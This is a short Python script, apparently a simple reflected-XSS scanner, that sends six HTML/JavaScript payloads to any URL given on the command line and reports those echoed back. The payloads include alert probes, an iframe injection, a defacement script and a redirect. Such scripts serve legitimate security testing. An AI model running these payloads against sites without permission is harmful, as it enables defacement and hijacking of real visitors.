#!/usr/bin/python3
"""
XSS Testing Script with Response Display
"""

import requests
import sys

def test_xss(url, payloads):
    """Test XSS vulnerabilities"""
    
    vulnerable = False
    
    # Test each payload
    for payload in payloads:
        try:
            # Test GET request
            response = requests.get(f"{url}?input={payload}")
            
            # Check if payload appears in response
            if payload in response.text:
                vulnerable = True
                print(f"[+] Vulnerable to XSS: Payload '{payload}' appears in response")
                print(f"[+] Response preview (first 200 chars): {response.text[:200]}...")
                
        except Exception as e:
            print(f"[!] Error testing payload '{payload}': {e}")
    
    return vulnerable

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    payloads = [
        "<h1>hello</h1>",
        "<script>document.write('<iframe src=\"http://example.com></iframe>')</script>",
        "<script>alert(3);</script>",
        "<SCRIPT>alert(3);</SCRIPT>",
        "<script>document.body.innerHTML=\"<h1>you have been hacked</h1></br></br><img src=\\\"https://example.com/image.jpg\\\"></img>\"</script>",
        "<script>window.location=\"https://example.com\"</script>"
    ]
    
    vulnerable = test_xss(target_url, payloads)
    
    if vulnerable:
        print("[+] Target appears vulnerable to XSS attacks!")
    else:
        print("[-] No obvious XSS vulnerabilities detected.")

if __name__ == "__main__":
    main()
